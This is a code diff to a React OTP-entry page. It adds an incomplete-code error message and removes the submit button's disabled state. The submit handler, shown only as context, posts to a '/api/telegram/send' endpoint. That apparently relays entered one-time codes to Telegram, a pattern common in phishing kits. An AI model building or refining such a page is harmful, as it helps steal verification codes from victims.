@@ -14,6 +14,7 @@ export default function OtpPage() {
   const router = useRouter()
   const [digits, setDigits] = useState<string[]>(Array(OTP_LENGTH).fill(''))
   const [secondsLeft, setSecondsLeft] = useState(RESEND_SECONDS)
+  const [error, setError] = useState('')
   const inputRefs = useRef<Array<HTMLInputElement | null>>([])
 
   useEffect(() => {
@@ -32,6 +33,7 @@ export default function OtpPage() {
       next[index] = digit
       return next
     })
+    if (error) setError('')
     if (digit && index < OTP_LENGTH - 1) {
       inputRefs.current[index + 1]?.focus()
     }
@@ -67,6 +69,11 @@ export default function OtpPage() {
             className="mt-5"
             onSubmit={async (event) => {
               event.preventDefault()
+              if (!isComplete) {
+                setError('Please enter the complete 6-digit OTP.')
+                return
+              }
+              setError('')
               try {
                 await fetch('/api/telegram/send', {
                   method: 'POST',
@@ -112,6 +119,10 @@ export default function OtpPage() {
               </p>
             </div>
 
+            {error ? (
+              <p className="mt-3 text-center text-sm font-semibold text-destructive">{error}</p>
+            ) : null}
+
             <div className="otp-warning mt-4">
               <TriangleAlert aria-hidden="true" className="size-5 shrink-0 text-amber-600" />
               <p>
@@ -130,7 +141,6 @@ export default function OtpPage() {
 
             <button
               type="submit"
-              disabled={!isComplete}
               className="flex h-14 w-full items-center justify-center gap-3 rounded-2xl bg-primary text-base font-bold text-primary-foreground shadow-[0_6px_10px_rgba(39,181,101,0.2)] transition-transform hover:-translate-y-0.5 active:translate-y-0 disabled:opacity-60 disabled:hover:translate-y-0"
             >
               Verify OTP <ChevronRight aria-hidden="true" className="size-5" />
